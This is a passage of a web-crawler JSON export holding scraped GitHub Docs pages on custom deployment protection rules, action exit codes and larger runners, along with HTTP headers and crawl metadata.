      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "0995:109028:EE974F:137519D:681C5164",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:28 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686308.022149, VS0, VE244",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "27678",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Configuring custom deployment protection rules\nUse GitHub Apps to automate protecting deployments with third-party systems.\nWho can use this feature?\nCustom deployment protection rules are available in public repositories for all plans. For access to custom deployment protection rules in private or internal repositories, you must use GitHub Enterprise. For more information, see GitHub’s plans.\nNote\nCustom deployment protection rules are currently in public preview and subject to change.\nAbout custom deployment protection rules\nCustom deployment protection rules are powered by GitHub Apps. Once a deployment protection rule is configured and installed in a repository, it can be enabled for any environments in the repository.\nAfter you enable a custom deployment protection rule on an environment, every time a workflow step targets that environment, the deployment protection rule will run automatically. For more information about targeting an environment for deployments, see Managing environments for deployment.\nWhen a custom deployment protection rule is triggered it will wait for up to 30 days for a webhook event response before it times out and the workflow job fails.\nFor more information about creating your own custom deployment protection rules, see Creating custom deployment protection rules.\nNote\nAny number of GitHub Apps-based deployment protection rules can be installed on a repository. However, a maximum of 6 deployment protection rules can be enabled on any environment at the same time.\nUsing existing custom deployment protection rules\nYou can choose to create your own custom deployment protection rules or you may use any existing custom deployment protection rules.\nThe following is a list of official partner implementations for deployment protection rules.\nDatadog: you can enforce protection rules on your GitHub Actions deployment workflows using Datadog monitors. For more information, see Gating your GitHub Actions Deployments with Datadog Monitors in the Datadog documentation.\nHoneycomb: you can define thresholds to reject or approve deployments based on data you are sending to Honeycomb. For more information, see the Honeycomb app in the GitHub Marketplace.\nNew Relic: for more information, see the New Relic app in the GitHub Marketplace.\nNCM NodeSource: for more information, see the NCM NodeSource app in the GitHub Marketplace.\nSentry: for more information, see the Sentry Deployment Gate app in the GitHub Marketplace.\nServiceNow: for more information, see GitHub integration with DevOps Change Velocity in the ServiceNow documentation.\nPrerequisites\nIn order for a custom deployment protection rule to be available to all environments in a repository, you must first install the custom deployment protection rule on the repository. For more information, see Installing your own GitHub App.\nAfter a custom deployment protection rule has been installed in a repository, it must be enabled for each environment where you want the rule to apply.\nEnabling custom deployment protection rules for the environment\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Settings. If you cannot see the \"Settings\" tab, select the dropdown menu, then click Settings.\nIn the left sidebar, click Environments.\nSelect the environment you want to configure.\nUnder \"Deployment protection rules,\" check the box next to each custom deployment protection rule you want to enable for the environment.\nClick Save protection rules.\nOnce a custom deployment protection rule has been enabled for an environment, it will automatically run whenever a workflow reaches a job that references the environment. You can see the results of an approval or rejection for your deployment by reviewing the details of the deployment. For more information, see Reviewing deployments.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-configuring-custom-deployment-protection-rules-epr6x.html",
  "markdown": "# Configuring custom deployment protection rules\n\nUse GitHub Apps to automate protecting deployments with third-party systems.\n\n## Who can use this feature?\n\nCustom deployment protection rules are available in public repositories for all plans. For access to custom deployment protection rules in private or internal repositories, you must use GitHub Enterprise. For more information, see [GitHub’s plans](https://docs.github.com/en/get-started/learning-about-github/githubs-plans).\n\nNote\n\nCustom deployment protection rules are currently in public preview and subject to change.\n\n## [About custom deployment protection rules](#about-custom-deployment-protection-rules)\n\nCustom deployment protection rules are powered by GitHub Apps. Once a deployment protection rule is configured and installed in a repository, it can be enabled for any environments in the repository.\n\nAfter you enable a custom deployment protection rule on an environment, every time a workflow step targets that environment, the deployment protection rule will run automatically. For more information about targeting an environment for deployments, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment).\n\nWhen a custom deployment protection rule is triggered it will wait for up to 30 days for a webhook event response before it times out and the workflow job fails.\n\nFor more information about creating your own custom deployment protection rules, see [Creating custom deployment protection rules](https://docs.github.com/en/actions/deployment/protecting-deployments/creating-custom-deployment-protection-rules).\n\nNote\n\nAny number of GitHub Apps-based deployment protection rules can be installed on a repository. However, a maximum of 6 deployment protection rules can be enabled on any environment at the same time.\n\n## [Using existing custom deployment protection rules](#using-existing-custom-deployment-protection-rules)\n\nYou can choose to create your own custom deployment protection rules or you may use any existing custom deployment protection rules.\n\nThe following is a list of official partner implementations for deployment protection rules.\n\n*   Datadog: you can enforce protection rules on your GitHub Actions deployment workflows using Datadog monitors. For more information, see [Gating your GitHub Actions Deployments with Datadog Monitors](https://docs.datadoghq.com/continuous_integration/guides/github_gating/) in the Datadog documentation.\n*   Honeycomb: you can define thresholds to reject or approve deployments based on data you are sending to Honeycomb. For more information, see [the Honeycomb app](https://github.com/apps/honeycomb-io) in the GitHub Marketplace.\n*   New Relic: for more information, see [the New Relic app](https://github.com/apps/new-relic-gate) in the GitHub Marketplace.\n*   NCM NodeSource: for more information, see [the NCM NodeSource app](https://github.com/apps/ncm-nodesource) in the GitHub Marketplace.\n*   Sentry: for more information, see [the Sentry Deployment Gate app](https://github.com/apps/sentry-deployment-gate) in the GitHub Marketplace.\n*   ServiceNow: for more information, see [GitHub integration with DevOps Change Velocity](https://www.servicenow.com/docs/bundle/utah-devops/page/product/enterprise-dev-ops/concept/github-integration-dev-ops.html) in the ServiceNow documentation.\n\n## [Prerequisites](#prerequisites)\n\nIn order for a custom deployment protection rule to be available to all environments in a repository, you must first install the custom deployment protection rule on the repository. For more information, see [Installing your own GitHub App](https://docs.github.com/en/apps/maintaining-github-apps/installing-github-apps).\n\nAfter a custom deployment protection rule has been installed in a repository, it must be enabled for each environment where you want the rule to apply.\n\n## [Enabling custom deployment protection rules for the environment](#enabling-custom-deployment-protection-rules-for-the-environment)\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Settings**. If you cannot see the \"Settings\" tab, select the dropdown menu, then click **Settings**.\n    \n    ![Screenshot of a repository header showing the tabs. The \"Settings\" tab is highlighted by a dark orange outline.](https://docs.github.com/assets/cb-28260/images/help/repository/repo-actions-settings.png)\n    \n3.  In the left sidebar, click **Environments**.\n    \n4.  Select the environment you want to configure.\n    \n5.  Under \"Deployment protection rules,\" check the box next to each custom deployment protection rule you want to enable for the environment.\n    \n6.  Click **Save protection rules**.\n    \n\nOnce a custom deployment protection rule has been enabled for an environment, it will automatically run whenever a workflow reaches a job that references the environment. You can see the results of an approval or rejection for your deployment by reviewing the details of the deployment. For more information, see [Reviewing deployments](https://docs.github.com/en/actions/managing-workflow-runs/reviewing-deployments).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 246,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-configuring-custom-deployment-protection-rules-original",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-configuring-custom-deployment-protection-rules-removedE",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-configuring-custom-deployment-protection-rules-extractu",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-configuring-custom-deployment-protection-rules-readable",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-configuring-custom-deployment-protection-rules-readable"
    },
    "lengths": {
      "extractus": 6892,
      "readableText": 6443,
      "none": 27337,
      "readableTextIfPossible": 27337,
      "result": 6443,
      "markdown": 5220
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions",
    "loadedTime": "2025-05-08T06:38:32.417Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions",
    "title": "Setting exit codes for actions - GitHub Docs",
    "description": "You can use exit codes to set the status of an action. GitHub displays statuses to indicate passing or failing actions.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Setting exit codes for actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "8948:9744C:E7C0CE:12DE513:681C4F59",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "520",
      "date": "Thu, 08 May 2025 06:38:25 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "0",
      "x-timer": "S1746686305.425850, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "24879",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Setting exit codes for actions\nYou can use exit codes to set the status of an action. GitHub displays statuses to indicate passing or failing actions.\nAbout exit codes\nGitHub uses the exit code to set the action's check run status, which can be success or failure.\nExit statusCheck run statusDescription\n0\tsuccess\tThe action completed successfully and other tasks that depend on it can begin.\t\nNonzero value (any integer but 0)\tfailure\tAny other exit code indicates the action failed. When an action fails, all concurrent actions are canceled and future actions are skipped. The check run and check suite both get a failure status.\t\nSetting a failure exit code in a JavaScript action\nIf you are creating a JavaScript action, you can use the actions toolkit @actions/core package to log a message and set a failure exit code. For example:\ntry { // something } catch (error) { core.setFailed(error.message); } \nFor more information, see Creating a JavaScript action.\nSetting a failure exit code in a Docker container action\nIf you are creating a Docker container action, you can set a failure exit code in your entrypoint.sh script. For example:\nif <condition> ; then echo \"Game over!\" exit 1 fi \nFor more information, see Creating a Docker container action.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-setting-exit-codes-for-actions-1a9q5.html",
  "markdown": "# Setting exit codes for actions\n\nYou can use exit codes to set the status of an action. GitHub displays statuses to indicate passing or failing actions.\n\n## [About exit codes](#about-exit-codes)\n\nGitHub uses the exit code to set the action's check run status, which can be `success` or `failure`.\n\n| Exit status | Check run status | Description |\n| --- | --- | --- |\n| `0` | `success` | The action completed successfully and other tasks that depend on it can begin. |\n| Nonzero value (any integer but 0) | `failure` | Any other exit code indicates the action failed. When an action fails, all concurrent actions are canceled and future actions are skipped. The check run and check suite both get a `failure` status. |\n\n## [Setting a failure exit code in a JavaScript action](#setting-a-failure-exit-code-in-a-javascript-action)\n\nIf you are creating a JavaScript action, you can use the actions toolkit [`@actions/core`](https://github.com/actions/toolkit/tree/main/packages/core) package to log a message and set a failure exit code. For example:\n\n```\ntry {\n  // something\n} catch (error) {\n  core.setFailed(error.message);\n}\n```\n\nFor more information, see [Creating a JavaScript action](https://docs.github.com/en/actions/creating-actions/creating-a-javascript-action).\n\n## [Setting a failure exit code in a Docker container action](#setting-a-failure-exit-code-in-a-docker-container-action)\n\nIf you are creating a Docker container action, you can set a failure exit code in your `entrypoint.sh` script. For example:\n\n```\nif <condition> ; then\n  echo \"Game over!\"\n  exit 1\nfi\n```\n\nFor more information, see [Creating a Docker container action](https://docs.github.com/en/actions/creating-actions/creating-a-docker-container-action).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 236,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-setting-exit-codes-for-actions-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-setting-exit-codes-for-actions-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-setting-exit-codes-for-actions-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-setting-exit-codes-for-actions-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-setting-exit-codes-for-actions-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 2672,
      "readableText": 2584,
      "none": 22446,
      "readableTextIfPossible": 22446,
      "result": 2584,
      "markdown": 1734
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners",
    "loadedTime": "2025-05-08T06:38:40.723Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners",
    "title": "About larger runners - GitHub Docs",
    "description": "GitHub offers runners with advanced features to support more customized use cases.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "About larger runners - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "8810:1F18CA:FBF59E:144BAFD:681C513D",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:38:33 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686313.439389, VS0, VE314",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "30763",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "About larger runners - GitHub Docs\nGitHub offers runners with advanced features to support more customized use cases.\nWho can use this feature?\nLarger runners are only available for organizations and enterprises using the GitHub Team or GitHub Enterprise Cloud plans.\nOverview of larger runners\nCustomers on GitHub Team and GitHub Enterprise Cloud plans can choose from a range of managed virtual machines that have more resources than the standard GitHub-hosted runners. These machines are referred to as \"larger runner.\" They offer the following advanced features:\nMore RAM, CPU, and disk space\nStatic IP addresses\nAzure private networking\nThe ability to group runners\nAutoscaling to support concurrent workflows\nGPU-powered runners\nThese larger runners are hosted by GitHub and have the runner application and other tools preinstalled.\nGitHub offers larger runners with macOS, Ubuntu, or Windows operating systems, and different features and sizes are available depending on which operating system you use. For more information, see Additional features for larger runners.\nAbout Ubuntu and Windows larger runners\nLarger runners with Ubuntu or Windows operating systems are configured in your organization or enterprise. When you add a larger runner, you are defining a type of machine from a selection of available hardware specifications and operating system images. GitHub will then create multiple instances of this runner that scale up and down to match the job demands of your organization, based on the autoscaling limits you define. For more information, see Managing larger runners.\nUbuntu and Windows larger runners offer autoscaling capabilities and the ability to assign the runners static IP addresses from a specific range. They can also be managed using runner groups, which enables you to control access to the larger runners. For more information, see Additional features for larger runners.\nAbout macOS larger runners\nLarger runners with a macOS operating system are used by updating the YAML workflow label to the desired runner image. To run your workflows on a macOS larger runner, update the runs-on key to use one of the GitHub-defined macOS larger runner labels. No additional configuration is required. For more information, see Running jobs on larger runners.\nThe following machines sizes are available for macOS larger runners.\nRunner SizeArchitectureProcessor (CPU)Memory (RAM)Storage (SSD)Workflow label\nLarge\tIntel\t12\t30 GB\t14 GB\tmacos-latest-large, macos-13-large, macos-14-large [latest], macos-15-large [Public preview]\t\nXLarge\tarm64 (M1)\t6 (+ 8 GPU hardware acceleration)\t14 GB\t14 GB\tmacos-latest-xlarge, macos-13-xlarge , macos-14-xlarge [latest], macos-15-xlarge [Public preview]\t\nLimitations for macOS larger runners\nAll actions provided by GitHub are compatible with arm64 GitHub-hosted runners. However, community actions may not be compatible with arm64 and need to be manually installed at runtime.\nNested-virtualization and Metal Performance Shaders (MPS) are not supported due to the limitation of Apple's Virtualization Framework.\nNetworking capabilities such as Azure private networking and assigning static IPs are not currently available for macOS larger runners.\nThe arm64 macOS runners do not have a static UUID/UDID assigned to them because Apple does not support this feature. However, Intel MacOS runners are assigned a static UDID, specifically 4203018E-580F-C1B5-9525-B745CECA79EB. If you are building and signing on the same host you plan to test the build on, you can sign with a development provisioning profile. If you do require a static UDID, you can use Intel runners and add their UDID to your Apple Developer account.\nAdditional features for larger runners\nCompared to standard GitHub-hosted runners, larger runners have additional features, and their availability varies depending on the larger runner's operating system.\nThese features can enhance your CI/CD pipelines in the following ways.\nAssigning larger runners static IP addresses from a specific range enables you to use this range to configure a firewall allowlist. For more information, see Networking for larger runners.\nAutoscaling enables larger runners to scale up to a maximum limit set by you, so your workflows can run concurrently. For more information, see Autoscaling larger runners.\nRunner groups allow you to control access to larger runners for your organizations, repositories, and workflows. For more information, see Controlling access to larger runners.\nRunner images\nLarger runners run on virtual machines (VMs), and GitHub installs a virtual hard disk (VHD) on this machine during the VM creation process. You can choose from different VM images to install on your runners.\nGitHub-owned images: These images are maintained by GitHub and are available for Linux x64, Windows x64, and macOS (x64 and arm) runners. For more information on these images and a full list of included tools for each runner operating system, see the GitHub Actions Runner Images repository.\nPartner Images: Partner images are not managed by GitHub and are pulled from the Azure Marketplace. See below for resources on where to find more information and to report issues for partner images.\nBase Windows 11 desktop image.\nNVIDIA GPU-Optimized VMI\nData Science Virtual Machine - Windows 2019.\narm64 images: actions/partner-runner-images repository.\nUnderstanding billing\nNote\nLarger runners are not eligible for the use of included minutes on private repositories. For both private and public repositories, when larger runners are in use, they will always be billed at the per-minute rate.\nCompared to standard GitHub-hosted runners, larger runners are billed differently. Larger runners are only billed at the per-minute rate for the amount of time workflows are executed on them. There is no cost associated with creating a larger runner that is not being used by a workflow. For more information, see About billing for GitHub Actions.\nMachine sizes for larger runners\nYou can choose from several specifications for larger runners.\nSpecifications for general larger runners\nCPUMemory (RAM)Storage (SSD)ArchitectureOperating system (OS)\n6\t14 GB\t14 GB\tarm64\tmacOS\t\n12\t30 GB\t14 GB\tx64\tmacOS\t\n2\t8 GB\t75 GB\tx64, arm64\tUbuntu\t\n4\t16 GB\t150 GB\tx64, arm64\tUbuntu, Windows\t\n8\t32 GB\t300 GB\tx64, arm64\tUbuntu, Windows\t\n16\t64 GB\t600 GB\tx64, arm64\tUbuntu, Windows\t\n32\t128 GB\t1200 GB\tx64, arm64\tUbuntu, Windows\t\n64\t208 GB\t2040 GB\tarm64\tUbuntu, Windows\t\n64\t256 GB\t2040 GB\tx64\tUbuntu, Windows\t\n96\t384 GB\t2040 GB\tx64\tUbuntu, Windows\t\nNote\nThe 4-vCPU Windows runner only works with the Windows Server 2025 or the Base Windows 11 Desktop image.\nSpecifications for GPU larger runners\nCPUGPUGPU cardMemory (RAM)GPU memory (VRAM)Storage (SSD)Operating system (OS)\n4\t1\tTesla T4\t28 GB\t16 GB\t176 GB\tUbuntu, Windows\t\nAbout runner groups\nNote\nOnly larger runners with Linux or Windows operating systems can be assigned to runner groups.\nRunner groups enable administrators to control access to runners at the organization and enterprise levels. With runner groups, you can collect sets of runners and create a security boundary around them. You can then decide which organizations or repositories are permitted to run jobs on those sets of machines. During the larger runner deployment process, the runner can be added to an existing group, otherwise it will join a default group. You can create a group by following the steps in Controlling access to larger runners.\nArchitectural overview of larger runners\nNote\nThis architecture diagram only applies to larger runners with Linux or Windows operating systems.\nLarger runners are managed at the organization level, where they are arranged into groups that can contain multiple instances of the runner. They can also be created at the enterprise level and shared with organizations in the hierarchy. Once you've created a group, you can then add a runner to the group and update your workflows to target either the group name or the label assigned to the larger runner. You can also control which repositories are permitted to send jobs to the group for processing. For more information about groups, see Controlling access to larger runners.\nIn the following diagram, a class of hosted runner named ubuntu-20.04-16core has been defined with customized hardware and operating system configuration.\nInstances of this runner are automatically created and added to a group called grp-ubuntu-20.04-16core.\nThe runners have been assigned the label ubuntu-20.04-16core.\nWorkflow jobs use the ubuntu-20.04-16core label in their runs-on key to indicate the type of runner they need to execute the job.\nGitHub Actions checks the runner group to see if your repository is authorized to send jobs to the runner.\nThe job runs on the next available instance of the ubuntu-20.04-16core runner.\nAutoscaling larger runners\nNote\nAutoscaling is only available for larger runners with Linux or Windows operating systems.\nLarger runners can automatically scale to suit your needs. You can provision machines to run a specified maximum number of jobs when jobs are submitted for processing. Each machine only handles one job at a time, so these settings effectively determine the number of jobs that can be run concurrently.\nYou can configure the maximum job concurrency, which allows you to control your costs by setting the maximum parallel number of jobs that can be run using this set. A higher value here can help avoid workflows being blocked due to parallelism. For more information on how to set limits, see Managing larger runners. For more information on the maximum auto-scaling limits for GitHub-hosted runners, see Usage limits, billing, and administration.\nAssigning static IP addresses to larger runners\nYou can assign static IP addresses only to larger runners that use Linux or Windows operating systems.\nStatic IP addresses assigned are all usable and are not in CIDR notation.\nPrivate networking for GitHub-hosted runners does not support static IP addresses for larger runners. For more information about private networking for GitHub-hosted runners, see About Azure private networking for GitHub-hosted runners in your enterprise.\nNetworking for larger runners\nBy default, larger runners receive a dynamic IP address that changes for each job run. Optionally, GitHub Enterprise Cloud customers can configure their larger runners to receive static IP addresses from GitHub's IP address pool. For more information, see About GitHub's IP addresses.\nWhen enabled, instances of the larger runner will receive IP addresses from specific ranges that are unique to the runner, allowing you to use the ranges to configure a firewall allowlist. You can use up to 10 larger runners with static IP address ranges in total across all your larger runners. For more information, see Managing larger runners.\nIf you would like to use more than 10 larger runners with static IP address ranges, please contact us through the GitHub Support portal.\nNote\nIf runners are unused for more than 30 days, their IP address ranges are automatically removed and cannot be recovered.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-using-larger-runners-about-larger-runners-zx63s.html",
  "markdown": "# About larger runners - GitHub Docs\n\nGitHub offers runners with advanced features to support more customized use cases.\n\n## Who can use this feature?\n\nLarger runners are only available for organizations and enterprises using the GitHub Team or GitHub Enterprise Cloud plans.\n\n## [Overview of larger runners](#overview-of-larger-runners)\n\nCustomers on GitHub Team and GitHub Enterprise Cloud plans can choose from a range of managed virtual machines that have more resources than the [standard GitHub-hosted runners](https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners#supported-runners-and-hardware-resources). These machines are referred to as \"larger runner.\" They offer the following advanced features:\n\n*   More RAM, CPU, and disk space\n*   Static IP addresses\n*   Azure private networking\n*   The ability to group runners\n*   Autoscaling to support concurrent workflows\n*   GPU-powered runners\n\nThese larger runners are hosted by GitHub and have the runner application and other tools preinstalled.\n\nGitHub offers larger runners with macOS, Ubuntu, or Windows operating systems, and different features and sizes are available depending on which operating system you use. For more information, see [Additional features for larger runners](#additional-features-for-larger-runners).\n\n### [About Ubuntu and Windows larger runners](#about-ubuntu-and-windows-larger-runners)\n\nLarger runners with Ubuntu or Windows operating systems are configured in your organization or enterprise. When you add a larger runner, you are defining a type of machine from a selection of available hardware specifications and operating system images. GitHub will then create multiple instances of this runner that scale up and down to match the job demands of your organization, based on the autoscaling limits you define. For more information, see [Managing larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/managing-larger-runners).\n\nUbuntu and Windows larger runners offer autoscaling capabilities and the ability to assign the runners static IP addresses from a specific range. They can also be managed using runner groups, which enables you to control access to the larger runners. For more information, see [Additional features for larger runners](#additional-features-for-larger-runners).\n\n### [About macOS larger runners](#about-macos-larger-runners)\n\nLarger runners with a macOS operating system are used by updating the YAML workflow label to the desired runner image. To run your workflows on a macOS larger runner, update the `runs-on` key to use one of the GitHub-defined macOS larger runner labels. No additional configuration is required. For more information, see [Running jobs on larger runners](https://docs.github.com/en/actions/using-github-hosted-runners/running-jobs-on-larger-runners?platform=mac).\n\nThe following machines sizes are available for macOS larger runners.\n\n| Runner Size | Architecture | Processor (CPU) | Memory (RAM) | Storage (SSD) | Workflow label |\n| --- | --- | --- | --- | --- | --- |\n| Large | Intel | 12  | 30 GB | 14 GB | `macos-latest-large`, `macos-13-large`, `macos-14-large` \\[latest\\], `macos-15-large` \\[Public preview\\] |\n| XLarge | arm64 (M1) | 6 (+ 8 GPU hardware acceleration) | 14 GB | 14 GB | `macos-latest-xlarge`, `macos-13-xlarge` , 